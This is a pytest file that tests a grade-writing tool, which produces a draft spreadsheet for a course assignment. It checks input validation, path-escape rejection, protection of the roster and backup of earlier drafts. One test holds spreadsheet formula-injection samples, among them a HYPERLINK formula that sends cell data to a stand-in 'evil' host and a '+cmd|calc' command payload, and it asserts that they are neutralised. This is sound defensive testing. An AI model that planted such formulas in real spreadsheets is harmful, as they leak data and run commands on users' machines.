"""write_grades writes grades_draft.xlsx only, never the roster."""
from __future__ import annotations

import pytest
from openpyxl import load_workbook

from mcp_server.handlers import submissions
from mcp_server.safety import ToolError

_GRADES = {
    "assignment": "HW03",
    "max_points": 10,
    "criteria": [
        {"key": "routes", "label": "المسارات", "points": 6},
        {"key": "style", "label": "الجودة", "points": 4},
    ],
    "grades": [
        {"student_id": "120210001", "scores": {"routes": 5, "style": 3},
         "feedback": "المسارات ممتازة.", "flags": ["تشابه مع 120210002"]},
    ],
}


@pytest.fixture
def hw(ctx):
    base = ctx.submissions_root / "SE2026" / "HW03"
    base.mkdir(parents=True)
    return base


def test_write_grades_creates_draft(ctx, hw):
    result = submissions.write_grades(ctx, "SE2026/HW03", _GRADES)
    assert result["path"] == str(hw / "grades_draft.xlsx")
    assert result["students"] == 1
    assert result["warnings"] == []
    assert load_workbook(result["path"]).sheetnames[0] == "الدرجات"


def test_write_grades_leaves_roster_untouched(ctx, hw):
    roster = hw / "_roster.xlsx"
    roster.write_bytes(b"original-roster-bytes")
    submissions.write_grades(ctx, "SE2026/HW03", _GRADES)
    assert roster.read_bytes() == b"original-roster-bytes"


def test_write_grades_warns_when_criteria_do_not_add_up(ctx, hw):
    data = {**_GRADES, "max_points": 12}
    result = submissions.write_grades(ctx, "SE2026/HW03", data)
    assert len(result["warnings"]) == 1
    assert "10" in result["warnings"][0] and "12" in result["warnings"][0]


@pytest.mark.parametrize("broken", [
    {},
    {"criteria": [], "grades": []},
    {"criteria": [{"key": "a", "label": "A"}], "grades": []},
    {"criteria": [{"key": "a", "label": "A", "points": 1}]},
    {"criteria": [{"key": "a", "label": "A", "points": 1}], "grades": "x"},
])
def test_write_grades_rejects_malformed_input(ctx, hw, broken):
    with pytest.raises(ToolError):
        submissions.write_grades(ctx, "SE2026/HW03", broken)


def test_write_grades_rejects_escape(ctx):
    with pytest.raises(ToolError):
        submissions.write_grades(ctx, "../..", _GRADES)


# --- validation ----------------------------------------------------------
def _with(**changes):
    import copy
    data = copy.deepcopy(_GRADES)
    data.update(changes)
    return data


def _row(**changes):
    row = {"student_id": "120210001", "scores": {"routes": 5, "style": 3},
           "feedback": "ok", "flags": []}
    row.update(changes)
    return row


@pytest.mark.parametrize("broken", [
    _with(criteria=[{"key": "a", "label": "A", "points": "6"}]),
    _with(criteria=[{"key": "a", "label": "A", "points": True}]),
    _with(max_points="10"),
    _with(max_points=True),
    _with(grades=[_row(scores={"routes": 7})]),            # above criterion points
    _with(grades=[_row(scores={"routes": -1})]),           # negative
    _with(grades=[_row(scores={"routes": "5"})]),          # not a number
    _with(grades=[_row(scores={"routes": True})]),         # bool
    _with(grades=[_row(scores={"nope": 1})]),              # unknown key
    _with(grades=[_row(student_id="")]),
    _with(grades=[_row(student_id=None)]),
    _with(grades=[_row(), _row()]),                        # duplicate id
    _with(grades=[_row(feedback=5)]),
    _with(grades=[_row(flags="x")]),
    _with(grades=[_row(flags=[1])]),
])
def test_write_grades_rejects_invalid_values(ctx, hw, broken):
    with pytest.raises(ToolError):
        submissions.write_grades(ctx, "SE2026/HW03", broken)
    assert not (hw / "grades_draft.xlsx").exists()


def test_write_grades_unknown_score_key_is_named(ctx, hw):
    with pytest.raises(ToolError, match="nope"):
        submissions.write_grades(ctx, "SE2026/HW03", _with(grades=[_row(scores={"nope": 1})]))


def test_write_grades_accepts_null_scores_and_int_student_ids(ctx, hw):
    data = _with(grades=[_row(student_id=120210001, scores={"routes": None, "style": 3.5})])
    assert submissions.write_grades(ctx, "SE2026/HW03", data)["students"] == 1


def test_write_grades_rejects_oversized_payload(ctx, hw):
    data = _with(grades=[_row(feedback="x" * 1_000_001)])
    with pytest.raises(ToolError, match="1000000|حجم|large|size"):
        submissions.write_grades(ctx, "SE2026/HW03", data)


# --- formula injection ---------------------------------------------------
def test_write_grades_neutralises_spreadsheet_formulas(ctx, hw):
    import copy
    evil = '=HYPERLINK("http://evil/"&A1,"click")'
    data = copy.deepcopy(_GRADES)
    data["assignment"] = "+cmd|calc"
    data["criteria"][0]["label"] = "@SUM(1)"
    data["grades"][0]["student_id"] = "-120210001"
    data["grades"][0]["feedback"] = evil
    data["grades"][0]["flags"] = ["=1+1", "\tTAB"]
    snapshot = copy.deepcopy(data)

    path = submissions.write_grades(ctx, "SE2026/HW03", data)["path"]
    assert data == snapshot                      # caller's dict untouched

    wb = load_workbook(path)
    values = []
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for cell in row:
                if cell.data_type == "f":
                    # only the generated SUM/COUNT/... formulas may be formulas
                    assert str(cell.value).startswith(("=SUM(", "=COUNT(", "=IFERROR(",
                                                       "=COUNTIF(")), cell.value
                values.append(cell.value)
    assert "'" + evil in values
    assert any(isinstance(v, str) and v.startswith("'@SUM(1)") for v in values)
    assert not any(isinstance(v, str) and v.startswith("=HYPERLINK") for v in values)


# --- existing draft is never silently lost -------------------------------
def test_write_grades_keeps_previous_draft(ctx, hw):
    roster = hw / "_roster.xlsx"
    roster.write_bytes(b"roster")
    first = submissions.write_grades(ctx, "SE2026/HW03", _GRADES)
    assert "previous_draft" not in first
    draft = hw / "grades_draft.xlsx"
    draft.write_bytes(b"hand edited by grader")

    second = submissions.write_grades(ctx, "SE2026/HW03", _GRADES)
    prev = hw / "grades_draft.prev.xlsx"
    assert second["previous_draft"] == str(prev)
    assert prev.read_bytes() == b"hand edited by grader"
    assert roster.read_bytes() == b"roster"

    draft.write_bytes(b"second edit")
    submissions.write_grades(ctx, "SE2026/HW03", _GRADES)
    assert prev.read_bytes() == b"second edit"
